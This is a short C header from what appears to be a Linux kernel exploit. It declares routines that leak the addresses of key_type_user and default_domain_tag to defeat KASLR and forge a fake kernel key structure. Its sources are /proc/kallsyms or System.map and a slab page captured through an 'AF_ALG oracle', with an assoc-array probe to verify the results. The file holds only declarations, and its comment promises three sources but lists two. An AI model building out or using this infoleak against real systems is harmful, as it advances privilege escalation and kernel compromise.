#ifndef K2_LEAK_H
#define K2_LEAK_H

#include <stddef.h>
#include <stdint.h>
#include <sys/types.h>

/*
 * key_type_user / default_domain_tag discovery.  Both are static image
 * addresses, so either one yields the KASLR slide, and both are needed to
 * build a fake key and to compute index hashes.
 *
 * Three sources, cheapest first:
 *   1. /proc/kallsyms (kptr_restrict == 0) or /boot/System.map-$(uname -r)
 *   2. a retired struct key slab page captured through the AF_ALG oracle
 * Every candidate is verified by an assoc-array order probe, which fails
 * loudly if the hash function or the pointers are wrong.
 */

struct k2_key_pointers {
    uint64_t type;
    uint64_t domain;
    unsigned int votes;
    char source[24];
};

/* Capture one 4K page exposing the given 8-byte targets. */
typedef int (*k2_capture_fn)(const size_t *targets, size_t count,
                            useconds_t delay, unsigned char **page,
                            size_t *length);

int k2_symbol_key_pointers(struct k2_key_pointers *out);
int k2_leak_key_pointers(k2_capture_fn capture, unsigned int attempts,
                         useconds_t delay, struct k2_key_pointers *out);
int k2_verify_key_pointers(const struct k2_key_pointers *pointers);

#endif
